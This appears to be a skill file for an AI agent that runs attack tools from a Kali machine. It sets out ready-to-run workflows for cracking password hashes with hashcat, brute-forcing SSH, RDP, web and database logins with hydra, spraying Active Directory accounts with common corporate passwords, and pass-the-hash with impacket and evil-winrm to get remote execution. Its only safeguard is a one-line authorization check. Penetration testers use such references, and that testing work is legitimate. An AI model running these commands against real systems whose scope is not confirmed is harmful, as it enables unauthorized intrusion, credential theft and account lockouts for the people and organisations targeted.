# SKILL: password-attacks
# Password cracking, brute force, spraying — full reference
# Triggered when: "crack", "brute force", "password spray", "hashcat", "hydra"

## Trigger Phrases
- "crack [hash/file]"
- "brute force [service] on [target]"
- "password spray against [domain/service]"
- "run hashcat on [hashes]"
- "hydra against [target]"
- "what's the hash type"

## Authorization Gate
ALWAYS confirm: target is authorized, testing is in scope.
Password attacks are highly visible and cause account lockouts.
Get lockout policy BEFORE any brute force.

---

## WORKFLOW A — Hash Identification

```bash
# Identify hash type before cracking
kali_exec("hashid '[HASH]'")
kali_exec("hash-identifier '[HASH]'")
kali_exec("echo '[HASH]' | haiti")  # More accurate

# Hashcat example mode identification:
HASH_MODES = {
    "MD5":          0,
    "MD5crypt":     500,
    "SHA1":         100,
    "SHA256":       1400,
    "SHA512":       1700,
    "NTLM":         1000,
    "NetNTLMv1":    3000,
    "NetNTLMv2":    5600,
    "NTLMv2":       5600,
    "Kerberos 5 TGS (AS-REP)": 18200,
    "Kerberos 5 TGS (Kerberoast)": 13100,
    "bcrypt":       3200,
    "WPA/WPA2":     22000,
    "MySQL SHA1":   300,
    "MSSQL SHA1":   131,
    "Oracle T:H":   112,
    "Cisco IOS MD5": 500,
    "LinkedIn SHA1": 190,
    "Django SHA1":  124,
    "PBKDF2 SHA256": 10900,
    "Django PBKDF2": 10000,
}
```

---

## WORKFLOW B — Hashcat (GPU Cracking)

### Az's HP Kali Rig — 2GB NVIDIA Optimization

```bash
# Check GPU availability
kali_exec("hashcat -I")

# Basic rockyou attack (fastest — try first)
kali_exec("hashcat -m [MODE] [HASH_FILE] /usr/share/wordlists/rockyou.txt --force -d 1 -w 1")
# -w 1 = low workload (prevent VRAM overflow on 2GB)

# Rules attack (20x more effective than wordlist alone)
kali_exec("hashcat -m [MODE] [HASH_FILE] /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force -d 1")
kali_exec("hashcat -m [MODE] [HASH_FILE] /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/dive.rule --force -d 1")
# dive.rule = most comprehensive (2M rules, slower)

# Combination attack (combine two wordlists)
kali_exec("hashcat -m [MODE] [HASH_FILE] -a 1 /usr/share/wordlists/rockyou.txt /usr/share/seclists/Passwords/Common-Credentials/common-passwords-win.txt --force -d 1")

# Mask attack (patterns)
kali_exec("hashcat -m [MODE] [HASH_FILE] -a 3 ?u?l?l?l?l?d?d?d?d --force -d 1")
# ?u = uppercase, ?l = lowercase, ?d = digit, ?s = special
# Above = Company2024 patterns

# Corporate password patterns:
MASKS = [
    "?u?l?l?l?l?d?d?d?d",    # Company2024
    "?u?l?l?l?l?l?d?d?d?d",  # Company2024 (5 chars)
    "?u?l?l?l?l?l?l?d?d",    # Password12
    "?l?l?l?l?d?d?d?d?s",    # word1234!
    "?u?l?l?l?d?d?d?d?s",    # Word1234!
]

# Monitor progress
kali_exec("hashcat -m [MODE] [HASH_FILE] [WORDLIST] --force -d 1 --status --status-timer=30")

# Resume interrupted session
kali_exec("hashcat --restore")

# Show cracked hashes
kali_exec("hashcat -m [MODE] [HASH_FILE] --show")
```

### Custom Wordlists from Target

```bash
# CeWL — spider target website for wordlist
kali_exec("cewl https://[TARGET] -d 3 -m 6 -w custom_wordlist.txt --with-numbers")

# Company-specific wordlist generator
kali_write_file("/tmp/gen_wordlist.py", """
import itertools
company = "[COMPANY_NAME]"
year = "2024"
words = [company, company.lower(), company.upper(), company.capitalize()]
suffixes = ['', '1', '12', '123', '2023', '2024', '2025', '!', '@', '#']
prefixes = ['', '1', 'P@ssw0rd', 'Welcome']

with open('/tmp/company_wordlist.txt', 'w') as f:
    for w in words:
        for s in suffixes:
            f.write(f"{w}{s}\\n")
        for p in prefixes:
            f.write(f"{p}{w}\\n")
""")
kali_exec("python3 /tmp/gen_wordlist.py")
kali_exec("hashcat -m [MODE] [HASH_FILE] /tmp/company_wordlist.txt --force -d 1")
```

---

## WORKFLOW C — Online Brute Force (Hydra)

```bash
# Get lockout policy FIRST (critical)
# For SSH: usually unlimited (but IDS may block)
# For web: check login endpoint response after N failures
# For AD: net accounts /domain or crackmapexec --pass-pol

# SSH brute force
kali_exec("hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://[IP] -t 4 -V")

# HTTP POST (web login)
kali_exec("hydra -l admin -P /usr/share/wordlists/rockyou.txt [IP] http-post-form '/login:username=^USER^&password=^PASS^:F=Invalid password'")

# FTP
kali_exec("hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://[IP]")

# RDP
kali_exec("hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://[IP] -t 1")

# MSSQL
kali_exec("hydra -l sa -P /usr/share/wordlists/rockyou.txt mssql://[IP]")

# WinRM
kali_exec("hydra -l administrator -P /usr/share/wordlists/rockyou.txt [IP] winrm")
```

---

## WORKFLOW D — Password Spraying (AD)

```bash
# GET LOCKOUT POLICY FIRST — avoid locking accounts
kali_exec("crackmapexec smb [DC_IP] -u [ANY_USER] -p [ANY_PASS] --pass-pol 2>/dev/null")
# Typical: 5 failed attempts → 30 min lockout

# Spray — ONE password at a time, wait between rounds
# Round 1: most common corporate password
kali_exec("crackmapexec smb [DC_IP] -u users.txt -p 'Welcome1' --continue-on-success 2>/dev/null | grep '+'")

# Wait at least 30+ minutes (or lockout duration + buffer)
# Round 2: year-based password
kali_exec("crackmapexec smb [DC_IP] -u users.txt -p 'Company2024!' --continue-on-success 2>/dev/null | grep '+'")

# Round 3: seasonal
kali_exec("crackmapexec smb [DC_IP] -u users.txt -p 'Summer2024!' --continue-on-success 2>/dev/null | grep '+'")

# High-value spray candidates (ordered by success rate):
SPRAY_LIST = [
    "Welcome1", "Welcome1!", "Welcome2024",
    "[Company]2024", "[Company]2024!",
    "Password1", "Password1!",
    "Summer2024", "Winter2024", "Spring2025",
    "January2024", "December2024",
    "[City]2024",  # Common for Australian companies: Melbourne2024
    "Passw0rd", "Passw0rd!",
    "abc123", "abc123!",
]

# Kerbrute spray (no lockout — uses Kerberos pre-auth)
kali_exec("kerbrute passwordspray -d [DOMAIN] --dc [DC_IP] users.txt 'Welcome1'")
```

---

## WORKFLOW E — Pass-the-Hash / Pass-the-Ticket

```bash
# PtH with crackmapexec
kali_exec("crackmapexec smb [RANGE] -u administrator -H [NTLM_HASH] --local-auth")
kali_exec("crackmapexec smb [RANGE] -u [DOMAIN_USER] -H [NTLM_HASH]")

# PtH with impacket
kali_exec("impacket-psexec -hashes :[NTLM_HASH] administrator@[TARGET_IP]")
kali_exec("impacket-wmiexec -hashes :[NTLM_HASH] administrator@[TARGET_IP]")

# Evil-WinRM PtH
kali_exec("evil-winrm -i [TARGET_IP] -u administrator -H [NTLM_HASH]")

# PtT with Kerberos ticket
kali_exec("impacket-getTGT [DOMAIN]/[USER] -hashes :[NTLM_HASH]")
kali_exec("export KRB5CCNAME=[USER].ccache")
kali_exec("impacket-psexec -k -no-pass [DOMAIN]/administrator@[DC_FQDN]")
```

---

## Hash Cracking Speed Reference (Az's 2GB NVIDIA)

```
ALGORITHM    SPEED          TIME (14M rockyou)   TIME (+best64 rules)
──────────────────────────────────────────────────────────────────────
MD5          ~5B H/s        <1 second            <1 second
SHA1         ~2B H/s        <1 second            <1 second
SHA256       ~1B H/s        <1 second            <5 seconds
NTLM         ~3B H/s        <1 second            <1 second
NetNTLMv2    ~600M H/s      <1 second            <5 seconds
WPA2         ~100k H/s      ~3 minutes           ~3 hours
bcrypt $2a$  ~10k H/s       ~20 minutes          ~2 days
Kerberoast   ~250M H/s      <1 second            <30 seconds
AS-REP       ~250M H/s      <1 second            <30 seconds
```

**Tip: For WPA2 on 2GB VRAM — use `-w 1` to avoid OOM:**
```bash
hashcat -m 22000 hash.hc22000 rockyou.txt -r best64.rule -w 1 -d 1 --force
```

---

## Evidence Collection

```
loot/[MISSION]/passwords/
├── hashes.txt              # All captured hashes (format: hash:type)
├── hashes_ntlm.txt         # NTLM hashes
├── hashes_netntlmv2.txt    # NTLMv2 hashes from Responder
├── hashes_kerberoast.txt   # Kerberoast TGS hashes
├── hashes_asrep.txt        # AS-REP roasting hashes
├── cracked.txt             # Cracked: hash:plaintext format
├── spray_results.txt       # Password spray results
└── valid_creds.txt         # ENCRYPTED — valid username:password pairs
```

---

## Cost Notes
- GPU cracking: Az's rig = $0 hardware cost
- Hydra/spray: negligible compute cost
- Kerbrute: zero — works over Kerberos
- crackmapexec: zero — direct protocol
- No LLM tokens needed for this skill — pure tool execution
